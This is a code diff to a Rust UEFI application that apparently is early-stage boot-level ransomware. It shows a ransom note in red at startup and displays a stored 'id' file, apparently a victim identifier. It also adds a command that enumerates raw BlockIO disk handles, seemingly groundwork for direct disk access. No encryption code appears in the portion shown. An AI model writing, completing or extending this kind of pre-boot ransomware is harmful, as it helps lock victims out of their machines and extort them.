@@ -8,20 +8,30 @@ use core::fmt::Write;
 use alloc::boxed::Box;
 use uefi::prelude::*;
 use uefi::{Char16, Event, ResultExt};
-use uefi::proto::console::text::{Color, Key, Output};
+use uefi::proto::console::text::{Color, Key};
 use alloc::string::{String};
 use core::alloc::Layout;
 use core::str;
 use uefi::exts::allocate_buffer;
+use uefi::proto::media::block::BlockIO;
 use uefi::proto::media::file::{File, FileAttribute, FileInfo, FileMode};
 use uefi::proto::media::fs::SimpleFileSystem;
 
-fn init_screen(stdout: &mut Output) {
-    stdout.clear().unwrap().unwrap();
-    stdout.enable_cursor(true).unwrap_success();
-    stdout.set_color(Color::Red, Color::Black).unwrap_success();
-    stdout.write_str(include_str!("ransom_note.txt")).unwrap();
-    stdout.write_str("\n> ").unwrap();
+fn init_screen(st: &mut SystemTable<Boot>) {
+    st.stdout().clear().unwrap().unwrap();
+    st.stdout().enable_cursor(true).unwrap_success();
+    st.stdout().set_color(Color::Red, Color::Black).unwrap_success();
+    st.stdout().write_str(include_str!("ransom_note.txt")).unwrap();
+
+    match read_file(&st, "id") {
+        Ok(buf) => {
+            let content = str::from_utf8(&buf).unwrap();
+            st.stdout().write_str(content).unwrap();
+        },
+        Err(_) => { st.stdout().write_str("File not found").unwrap(); }
+    }
+
+    st.stdout().write_str("\n> ").unwrap();
 }
 
 fn read_file(st: &SystemTable<Boot>, filename: &str) -> Result<Box<[u8]>, ()> {
@@ -65,7 +75,7 @@ fn read_file(st: &SystemTable<Boot>, filename: &str) -> Result<Box<[u8]>, ()> {
 }
 
 fn take_input(system_table: &mut SystemTable<Boot>, char_16: Char16, buffer: &mut String) {
-    let st = unsafe {system_table.unsafe_clone()};
+    let mut st = unsafe {system_table.unsafe_clone()};
     let stdout = system_table.stdout();
     let char_key = char::from(char_16);
     match char_key {
@@ -74,25 +84,15 @@ fn take_input(system_table: &mut SystemTable<Boot>, char_16: Char16, buffer: &mu
         '\r' => {
             if buffer == "clear" {
                 stdout.clear().unwrap_success();
-                init_screen(stdout);
+                init_screen(&mut st);
                 buffer.clear();
             } else if buffer == "test" {
-                stdout.write_char('\n').unwrap();
 
-                match read_file(&st, "test.txt") {
-                    Ok(buf) => {
-                        let content = str::from_utf8(&buf).unwrap();
-                        stdout.write_str(content).unwrap();
-                    },
-                    Err(_) => {
-                        stdout.write_str("File not found").unwrap();
-                    }
-                }
+                let blockio = st.boot_services().find_handles::<BlockIO>().unwrap_success();
+                log::info!("{:#?}", blockio.len());
+                log::info!("{:#?}", blockio[0]);
 
-                stdout.write_str("\n> ").unwrap();
-                buffer.clear();
-            }
-            else {
+            } else {
                 stdout.write_char('\n').unwrap();
                 stdout.write_str(buffer.as_str()).unwrap();
                 stdout.write_str("\n> ").unwrap();
@@ -124,7 +124,7 @@ fn wait_for_input(boot_services: &BootServices, events: &mut [Event; 1]) {
 fn main(_handle: Handle, mut st: SystemTable<Boot>) -> Status {
     uefi_services::init(&mut st).unwrap_success();
 
-    init_screen(st.stdout());
+    init_screen(&mut st);
     let mut buffer: String = String::from("");
 
     let mut key_event = unsafe { [st.stdin().wait_for_key_event().unsafe_clone()] };
